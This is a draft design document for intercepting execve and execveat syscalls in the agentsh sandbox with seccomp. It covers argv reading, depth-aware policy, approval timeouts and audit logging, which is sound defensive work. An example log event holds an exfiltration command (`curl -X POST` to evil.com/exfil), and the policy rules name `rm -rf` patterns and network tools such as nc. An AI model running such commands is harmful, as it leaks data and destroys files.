# Execve Interception Design

**Status:** Draft
**Created:** 2026-01-19
**Author:** Claude + Eran

## Overview

### Problem

The shell shim intercepts top-level commands, but nested executions (e.g., `sh -c "sudo whoami"`) bypass policy checks. The seccomp infrastructure exists but doesn't trap `execve`.

### Solution

Extend seccomp user-notify to intercept all `execve` and `execveat` syscalls, evaluate them against policy with full argv inspection, and log every execution.

### Goals

1. **Complete coverage** - Every binary execution in the session goes through policy
2. **Full audit trail** - All execve calls logged, regardless of decision
3. **Depth-aware policy** - Different rules for direct vs nested execution
4. **Argument inspection** - Block dangerous arg patterns (e.g., `rm -rf`)
5. **Approval flow** - Support interactive approval with timeout, deny as default

### Non-goals

- Performance optimization via bypass (can add later if needed)
- BPF-level allowlists (keeping filter simple)

### Security Model

- Fail-secure: timeout on approval → deny
- Fail-secure: truncated argv → configurable, default deny
- Defense in depth: works alongside existing shim checks
- Tamper-proof: depth tracking is handler-side, not env vars

## Syscall Interception

### Syscalls Trapped

| Syscall | Number (x86_64) | Description |
|---------|-----------------|-------------|
| `SYS_EXECVE` | 59 | Standard exec |
| `SYS_EXECVEAT` | 322 | Exec relative to dirfd |

Both use `SECCOMP_RET_USER_NOTIF` to send notifications to the handler.

### Filter Installation

Extend `InstallFilterWithConfig()` in `internal/netmonitor/unix/seccomp_linux.go`:

```go
if cfg.ExecveEnabled {
    trap := seccomp.ActNotify
    execRules := []seccomp.ScmpSyscall{
        seccomp.ScmpSyscall(unix.SYS_EXECVE),
        seccomp.ScmpSyscall(unix.SYS_EXECVEAT),
    }
    for _, sc := range execRules {
        if err := filt.AddRule(sc, trap); err != nil {
            return nil, fmt.Errorf("add execve rule %v: %w", sc, err)
        }
    }
}
```

### Internal Bypass

These paths skip interception entirely (fast-path in handler):

- `/usr/local/bin/agentsh*`
- `/bin/*.real`, `/usr/bin/*.real`
- `agentsh-unixwrap`

### Handler Routing

When notification received, check `req.Data.Syscall` to route to appropriate handler (socket ops vs execve).

## Reading Filename and Argv from Tracee Memory

### Execve Signatures

```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
int execveat(int dirfd, const char *pathname, char *const argv[], char *const envp[], int flags);
```

### Memory Reading Strategy

1. **Read filename** (arg0 for execve, arg1 for execveat):
   - Use `ProcessVMReadv` to read string from tracee memory
   - Resolve to absolute path (for execveat, combine dirfd + pathname)
   - Max length: 4096 bytes (PATH_MAX)

2. **Read argv array** (arg1 for execve, arg2 for execveat):
   - First read the pointer array (array of `uintptr`)
   - Stop at NULL terminator or `max_argc` limit
   - For each pointer, read the string it points to
   - Stop if cumulative bytes exceed `max_argv_bytes`
   - Set `truncated = true` if limits hit

```go
func readArgv(pid int, argvPtr uint64, cfg ExecveConfig) ([]string, bool, error) {
    var args []string
    var totalBytes int
    truncated := false

    for i := 0; i < cfg.MaxArgc; i++ {
        // Read pointer at argvPtr + i*8
        ptr := readPointer(pid, argvPtr + uint64(i*8))
        if ptr == 0 {
            break // NULL terminator
        }

        arg := readString(pid, ptr, cfg.MaxArgBytes - totalBytes)
        totalBytes += len(arg)
        args = append(args, arg)

        if totalBytes >= cfg.MaxArgvBytes {
            truncated = true
            break
        }
    }
    return args, truncated, nil
}
```

### Limits (Configurable)

| Setting | Default | Description |
|---------|---------|-------------|
| `max_argc` | 1000 | Maximum number of arguments to read |
| `max_argv_bytes` | 65536 | Maximum total bytes of argv data |
| `on_truncated` | deny | Action when limits exceeded |

## Depth Tracking and Context

### Depth Model

- Depth 0 = direct command (passed to `agentsh exec`)
- Depth 1 = immediate child execve
- Depth N = N levels of nested execution

### Context Sugar

| Context | Equivalent | Description |
|---------|------------|-------------|
| `direct` | `max_depth: 0` | Only top-level commands |
| `nested` | `min_depth: 1` | Only nested commands |
| `[direct, nested]` | no constraint | All depths (default) |

Explicit `min_depth` / `max_depth` available for fine control.

### Handler-side State

```go
type execveState struct {
    depth     int
    sessionID string
}

var pidStateMu sync.RWMutex
var pidState = map[int]execveState{}

func recordExecve(pid int, parentPID int, sessionID string) {
    pidStateMu.Lock()
    defer pidStateMu.Unlock()

    parentDepth := 0
    if parent, ok := pidState[parentPID]; ok {
        parentDepth = parent.depth
    }

    pidState[pid] = execveState{
        depth:     parentDepth + 1,
        sessionID: sessionID,
    }
}

func cleanupPID(pid int) {
    pidStateMu.Lock()
    defer pidStateMu.Unlock()
    delete(pidState, pid)
}
```

### Cleanup Mechanism

- Use `PR_SET_CHILD_SUBREAPER` to receive SIGCHLD for all descendants
- On child exit, call `cleanupPID(pid)`
- Prevents unbounded map growth and PID reuse collisions

## Policy Integration

### Unified Rules with Context

Existing `commands` rules extended with `context` field:

```yaml
commands:
  # Direct-only: user can run git, but scripts can't
  - name: allow-git-direct
    basenames: [git]
    decision: allow
    context: [direct]

  # Nested-only: compilers should only run from build tools
  - name: allow-cc-nested
    basenames: [gcc, clang, cc]
    decision: allow
    context:
      min_depth: 1
      max_depth: 3

  # Block dangerous patterns at any depth
  - name: block-dangerous-rm
    basenames: [rm]
    args_patterns: ["-(r|rf|fr)", "--recursive.*--force"]
    decision: deny
    context: [direct, nested]

  # Network tools need approval when nested
  - name: approve-nested-network
    basenames: [curl, wget]
    decision: approval
    context: [nested]
```

### Policy Evaluation Flow

```go
func (e *Engine) CheckExecve(filename string, argv []string, depth int) Decision {
    for _, rule := range e.compiledCommandRules {
        // 1. Check filename matches (path, basename, glob)
        if !rule.matchesFilename(filename) {
            continue
        }

        // 2. Check context/depth constraints
        if !rule.matchesDepth(depth) {
            continue
        }

        // 3. Check args patterns if specified
        if !rule.matchesArgs(argv) {
            continue
        }

        return rule.decision
    }

    return e.defaultDecision
}
```

**Rule precedence:** First match wins (same as existing behavior).

## Approval Flow with Timeout

### Challenge

Execve blocks the tracee completely until we respond. Long approval waits = frozen process.

### Configuration

```yaml
execve:
  approval_timeout: 10s
  approval_timeout_action: deny  # deny | allow
```

### Flow

```
execve trapped
    │
    ▼
Policy check → decision: approval
    │
    ▼
Send approval request to UI/API
    │
    ├─── User approves within timeout ──► Allow execve, log outcome
    │
    ├─── User denies within timeout ───► Deny execve, log outcome
    │
    └─── Timeout expires ──────────────► Deny execve, log as "timeout"
```

### Implementation

```go
func (h *ExecveHandler) handleApproval(req *seccomp.ScmpNotifReq, rule *Rule, ctx ExecveContext) {
    approvalReq := ApprovalRequest{
        ID:       generateID(),
        Type:     "execve",
        Filename: ctx.Filename,
        Argv:     ctx.Argv,
        Depth:    ctx.Depth,
        Rule:     rule.Name,
    }

    // Send to approval channel (UI picks it up)
    h.approvalChan <- approvalReq

    // Wait with timeout
    select {
    case result := <-approvalReq.ResponseChan:
        h.respond(req, result.Approved)
        h.logEvent(ctx, result.Outcome)

    case <-time.After(h.cfg.ApprovalTimeout):
        h.respond(req, false)  // deny on timeout
        h.logEvent(ctx, "timeout")
    }
}
```

**Important:** Must check `seccomp.NotifIDValid()` before responding - the tracee might have been killed while we waited.

## Event Schema and Logging

**Every execve is logged**, regardless of decision.

### Schema

```go
type ExecveEvent struct {
    // Standard fields
    ID        string    `json:"id"`
    Type      string    `json:"type"`      // "execve"
    Timestamp time.Time `json:"timestamp"`
    SessionID string    `json:"session_id"`

    // Process context
    PID       int    `json:"pid"`
    ParentPID int    `json:"parent_pid"`
    Depth     int    `json:"depth"`

    // Execve details
    Filename  string   `json:"filename"`
    Argv      []string `json:"argv"`
    Truncated bool     `json:"truncated"`

    // Policy result
    Decision        string `json:"decision"`           // allow/deny/redirect/approval
    MatchedRule     string `json:"matched_rule"`
    EffectiveAction string `json:"effective_action"`   // allowed/blocked/redirected

    // Conditional fields
    RedirectTo      string `json:"redirect_to,omitempty"`
    ApprovalID      string `json:"approval_id,omitempty"`
    ApprovalOutcome string `json:"approval_outcome,omitempty"`
}
```

### Example Event

```json
{
  "id": "evt-1705678901234",
  "type": "execve",
  "timestamp": "2026-01-19T14:30:00Z",
  "session_id": "sess_abc123",
  "pid": 12345,
  "parent_pid": 12300,
  "depth": 2,
  "filename": "/usr/bin/curl",
  "argv": ["curl", "-X", "POST", "https://evil.com/exfil"],
  "truncated": false,
  "decision": "deny",
  "matched_rule": "block-nested-curl",
  "effective_action": "blocked"
}
```

**Log even on internal bypass** - mark with `matched_rule: "internal_bypass"` for complete audit trail.

## Configuration Schema

### Full Configuration

```yaml
sandbox:
  seccomp:
    enabled: true

    # Existing unix socket config
    unix_socket:
      enabled: true

    # New execve interception config
    execve:
      enabled: true

      # Argv capture limits
      max_argc: 1000
      max_argv_bytes: 65536
      on_truncated: deny  # deny | allow | approval

      # Approval settings
      approval_timeout: 10s
      approval_timeout_action: deny  # deny | allow

      # Internal bypass (agentsh infrastructure)
      internal_bypass:
        - /usr/local/bin/agentsh
        - /usr/local/bin/agentsh-unixwrap
        - "*.real"  # shimmed shell originals

# Policy rules with context
commands:
  - name: allow-common-tools
    basenames: [ls, cat, grep, find, head, tail]
    decision: allow
    context: [direct, nested]

  - name: allow-git-direct
    basenames: [git]
    decision: allow
    context: [direct]

  - name: block-dangerous-rm
    basenames: [rm]
    args_patterns: ["-rf", "-fr", "/ ", "/*"]
    decision: deny

  - name: approve-nested-network
    basenames: [curl, wget, nc, netcat]
    decision: approval
    context: [nested]
```

### Defaults

| Setting | Default |
|---------|---------|
| `execve.enabled` | false (opt-in) |
| `context` | `[direct, nested]` (all depths) |
| `max_argc` | 1000 |
| `max_argv_bytes` | 65536 |
| `on_truncated` | deny |
| `approval_timeout` | 10s |
| `approval_timeout_action` | deny |

## Implementation Phases

### Phase 1: Seccomp Filter Extension

- Add `execve` and `execveat` to trapped syscalls in `internal/netmonitor/unix/seccomp_linux.go`
- Update `FilterConfig` struct with `ExecveEnabled` field
- Pass config through `agentsh-unixwrap`

### Phase 2: Argv Reader

- New file: `internal/netmonitor/unix/execve_reader.go`
- Implement `readFilename()`, `readArgv()` using `ProcessVMReadv`
- Handle both execve and execveat argument layouts
- Implement truncation logic with configurable limits

### Phase 3: Depth Tracking

- New file: `internal/netmonitor/unix/depth_tracker.go`
- PID→state map with mutex
- Integration with subreaper for cleanup on process exit
- Initial depth registration when session starts

### Phase 4: Handler Extension

- Extend `ServeNotify()` in `internal/netmonitor/unix/handler.go`
- Route execve/execveat syscalls to new handler function
- Implement internal bypass check
- Call policy engine with depth context

### Phase 5: Policy Engine Extension

- Add `context` field parsing to rule compiler
- Implement `matchesDepth()` for context evaluation
- New method `CheckExecve(filename, argv, depth)`

### Phase 6: Approval Integration

- Wire execve approval to existing approval flow
- Add timeout handling
- Ensure `NotifIDValid()` check before responding

### Phase 7: Testing

- Unit tests for argv reader, depth tracker
- Integration tests for nested execution scenarios
- Smoke test: `sh -c "curl ..."` should be intercepted

## Files Changed

### New Files

| File | Purpose |
|------|---------|
| `internal/netmonitor/unix/execve_reader.go` | argv/filename reading from tracee |
| `internal/netmonitor/unix/depth_tracker.go` | PID→depth state management |
| `internal/netmonitor/unix/execve_handler.go` | execve notification handler |

### Modified Files

| File | Changes |
|------|---------|
| `internal/netmonitor/unix/seccomp_linux.go` | Add execve/execveat to filter |
| `internal/netmonitor/unix/handler.go` | Route execve syscalls to new handler |
| `internal/policy/engine.go` | Add `CheckExecve()`, context matching |
| `internal/policy/rules.go` | Parse `context` field in rules |
| `internal/config/sandbox.go` | Add `execve` config section |
| `cmd/agentsh-unixwrap/main.go` | Pass execve config to filter |
| `pkg/types/events.go` | Add `ExecveEvent` type |

### Test Files

| File | Coverage |
|------|----------|
| `internal/netmonitor/unix/execve_reader_test.go` | Argv reading, truncation |
| `internal/netmonitor/unix/depth_tracker_test.go` | State management, cleanup |
| `internal/netmonitor/unix/execve_handler_test.go` | Handler logic |
| `internal/integration/execve_interception_test.go` | End-to-end scenarios |

## Security Considerations

1. **No userspace bypass** - Depth tracking is handler-side, cannot be spoofed by tracee
2. **Fail-secure defaults** - Timeout and truncation both default to deny
3. **Complete audit** - Every execve logged, including internal bypass
4. **Memory limits** - Bounded argv reading prevents DoS
5. **Race handling** - Check `NotifIDValid()` before responding to approvals
6. **Shebang coverage** - Script execution intercepted as interpreter execve
